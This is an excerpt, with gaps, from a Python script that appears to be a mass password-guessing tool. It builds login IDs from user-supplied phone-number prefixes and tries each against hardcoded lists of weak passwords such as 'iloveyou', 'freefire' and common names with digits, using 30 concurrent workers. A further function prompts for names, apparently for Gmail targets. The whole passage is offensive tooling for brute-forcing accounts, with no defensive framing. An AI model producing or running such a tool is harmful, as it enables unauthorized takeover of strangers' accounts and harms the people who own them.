...
def pak():
                user=[]
                clear()
                print('\033[1;31m Code example: 0633323046,0684600906,0687004244')
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'Abdullahi','ahmed1122','yusuf12345','muuse1234','khan12','asli786','keba123','salman123456','aabo123','786786']
...
def bd():
                user=[]
                clear()
                print('\033[1;31m Code example: 0613323046,0611522943,0617004244,')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'somalia','somalia','i love you','iloveyou','free fire','freefire']
                                Aking.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
...
def gmail():
                ...
                clear()
                print('\033[1;37m example: muhammad, ali, sayid, fahmo\033[1;97m')
                linex()
